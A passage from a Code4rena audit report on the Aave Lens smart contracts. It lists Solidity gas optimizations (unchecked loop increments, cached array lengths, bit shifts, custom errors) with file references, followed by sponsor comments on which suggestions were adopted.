i < byteHandle.length; ++i) {\n\nThe code would go from:\n\n    for (uint256 i; i < numIterations; ++i) {  \n     // ...  \n    }  \n\nto:\n\n    for (uint256 i; i < numIterations;) {  \n     // ...  \n     unchecked { ++i; }  \n    }  \n\nThe risk of overflow is inexistant for a `uint256` here.\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n    core\\modules\\follow\\ApprovalFollowModule.sol:41:        for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:66:            for (uint256 i = 0; i < addresses.length; ++i) {\n    core\\modules\\follow\\ApprovalFollowModule.sol:128:        for (uint256 i = 0; i < toCheck.length; ++i) {\n    core\\LensHub.sol:541:        for (uint256 i = 0; i < vars.datas.length; ++i) {\n    libraries\\InteractionLogic.sol:47:        for (uint256 i = 0; i < profileIds.length; ++i) {\n    libraries\\PublishingLogic.sol:403:        for (uint256 i = 0; i < byteHandle.length; ++i) {\n\n### Arithmetics\n\n#### Shift Right instead of Dividing by 2\n\nA division by 2 can be calculated by shifting one to the right.\n\nWhile the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\nI suggest replacing `/ 2` with `>> 1` here:\n\n    core\\modules\\ModuleGlobals.sol:109:        if (newTreasuryFee >= BPS_MAX / 2) revert Errors.InitParamsInvalid();\n    core\\FollowNFT.sol:134:            uint256 center = upper - (upper - lower) / 2;\n    core\\FollowNFT.sol:176:            uint256 center = upper - (upper - lower) / 2;\n\n### Errors\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nI'm quite certain that the sponsor is aware of this optimization, as the library `Errors` contains a lot of custom errors. Therefore, I won't explain it (suffice to say, they are cheaper than require statements + revert strings).\n\nThe finding here is that the contracts `ERC721Enumerable` and `ERC721Time` don't benefit from this practice:\n\n    core\\base\\ERC721Enumerable.sol:\n      53:         require(index < ERC721Time.balanceOf(owner), 'ERC721Enumerable: owner index out of bounds');\n      68:         require(\n      69              index < ERC721Enumerable.totalSupply(),\n      70              'ERC721Enumerable: global index out of bounds'\n      71          );\n\n    core\\base\\ERC721Time.sol:\n       77:         require(owner != address(0), 'ERC721: balance query for the zero address');\n       86:         require(owner != address(0), 'ERC721: owner query for nonexistent token');\n       95:         require(mintTimestamp != 0, 'ERC721: mint timestamp query for nonexistent token');\n      109:         require(_exists(tokenId), 'ERC721: token data query for nonexistent token');\n      131:         require(_exists(tokenId), 'ERC721Metadata: URI query for nonexistent token');\n      152:         require(to != owner, 'ERC721: approval to current owner');\n      154:         require(\n      155              _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n      156              'ERC721: approve caller is not owner nor approved for all'\n      157          );\n      166:         require(_exists(tokenId), 'ERC721: approved query for nonexistent token');\n      175:         require(operator != _msgSender(), 'ERC721: approve to caller');\n      202:         require(\n      203              _isApprovedOrOwner(_msgSender(), tokenId),\n      204              'ERC721: transfer caller is not owner nor approved'\n      205          );\n      230:         require(\n      231              _isApprovedOrOwner(_msgSender(), tokenId),\n      232              'ERC721: transfer caller is not owner nor approved'\n      233          );\n      262:         require(\n      263              _checkOnERC721Received(from, to, tokenId, _data),\n      264              'ERC721: transfer to non ERC721Receiver implementer'\n      265          );\n      293:         require(_exists(tokenId), 'ERC721: operator query for nonexistent token');\n      324:         require(\n      325              _checkOnERC721Received(address(0), to, tokenId, _data),\n      326              'ERC721: transfer to non ERC721Receiver implementer'\n      327          );\n      343:         require(to != address(0), 'ERC721: mint to the zero address');\n      344:         require(!_exists(tokenId), 'ERC721: token already minted');\n      395:         require(ERC721Time.ownerOf(tokenId) == from, 'ERC721: transfer of token that is not own');\n      396:         require(to != address(0), 'ERC721: transfer to the zero address');\n\nI suggest using custom errors in `ERC721Enumerable` and `ERC721Time`.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1075423322):**\n > Okay this is possibly the best gas report I have ever seen. Huge props to Dravee!\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1076895010):**\n > Implementing a whole lot of this in a new PR, here are some notes:\n> \n> 1. Inlining the handle hash computation increased code size by ~3 bytes and increased gas by 4, so we're not implementing that.\n> 2. Calldata instead of memory is valid but the reason we're doing this is to avoid stack too deep errors, follow NFT URI thing is a good catch though, and valid for the profile image URI too!\n> 3. The `= 0` initialization is there for clarity and I believe it's handled by the optimizer.\n> \n> Will write more, I'm currently at the unchecked increment section, which is valid. Anyway, C4 give this gigachad a medal.\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1077737245):**\n > Included unchecked increments, and cached array lengths (where possible) too!\n> \n> Unchecked increments: [aave/lens-protocol@37ab8ce](https://github.com/aave/lens-protocol/commit/37ab8cea46ec6cf1f1a20dd4f5d720c49da06dc2)<br>\n> Array length caching: [aave/lens-protocol@a698476](https://github.com/aave/lens-protocol/commit/a698476590fb58eb7f698079714cba31e9d10a5e)<br>\n> \n> The SHR sacrifices readability too much, though it's still valid. Lastly the custom errors I would say are not valid since that's just how ERC721 is built, we don't want to stray away from the standard, even in revert messages as much as possible.\n> \n> Overall this is a fantastic report!\n\n**[Zer0dot (Aave Lens) commented](https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1084955877):**\n > PSA: The happy path short-circuiting is only partly valid in that it saves a minor amount of gas (2-3 opcodes) since even the \"sad path\" is evaluated lazily, if the first condition evaluates to false, the second condition is not evaluated.\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}